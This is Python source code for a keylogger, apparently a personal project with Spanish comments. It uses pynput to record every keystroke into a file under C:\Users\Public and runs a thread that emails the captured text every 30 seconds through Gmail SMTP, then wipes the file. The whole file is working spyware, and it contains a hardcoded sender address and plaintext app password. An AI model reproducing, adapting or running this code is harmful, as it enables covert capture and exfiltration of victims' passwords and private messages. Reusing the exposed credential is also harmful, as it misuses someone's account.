import pynput.keyboard as keyboard
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import os
import threading

destiny = 'C:\\Users\\Public\\keylogs.txt'

# Configuración del correo
sender_email = "inteconnect516@gmail.com"
receiver_email = "inteconnect516@gmail.com"
password = "vtob sntg fdbo hxiq"

# Función para procesar el archivo, limpiar y enviar por correo
def send_email():
    while True:
        # Leer el archivo con los keylogs
            if os.path.getsize(destiny) > 0:  # Verifica si el archivo tiene contenido
                # Leer el archivo con los keylogs
                with open(destiny, 'r') as file:
                    data = file.read()

                data = data.replace('\n', ' ').strip()

                # Configurar el correo electrónico
                msg = MIMEMultipart()
                msg['From'] = sender_email
                msg['To'] = receiver_email
                msg['Subject'] = 'Keylogger Logs'

                # Agregar el contenido del archivo al cuerpo del correo
                msg.attach(MIMEText(data, 'plain'))

                # Conectar al servidor de correo y enviar
                try:
                    server = smtplib.SMTP('smtp.gmail.com', 587)
                    server.starttls()
                    server.login(sender_email, password)
                    text = msg.as_string()
                    server.sendmail(sender_email, receiver_email, text)
                    server.quit()
                    print("Correo enviado con éxito")

                    # Limpiar el archivo después de enviar el correo
                    open(destiny, 'w').close()  # Vacia el archivo
                except Exception as e:
                    print(f"Error al enviar el correo: {e}")
            else:
                print("El archivo está vacío. No se envió el correo.")

            time.sleep(30)

def on_press(key):
    logging.basicConfig(filename=destiny, level=logging.DEBUG, format='%(message)s')
    try:
        if key == keyboard.Key.space:
            logging.log(10, ' ')
            print('Key: Space')
        elif key == keyboard.Key.enter:
            logging.log(10, '\n')
            print('Key: Enter')
        elif key == keyboard.Key.backspace:
            # Elimina el último carácter del archivo al presionar Backspace
            with open(destiny, 'r') as file:
                data = file.read()
            data = data[:-1]  # Eliminar el último carácter
            with open(destiny, 'w') as file:
                file.write(data)
        else:
            logging.log(10, key.char)
            print('Key: {0}'.format(key))
    except AttributeError:
        pass


def start():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

threading.Thread(target=send_email).start()

start()

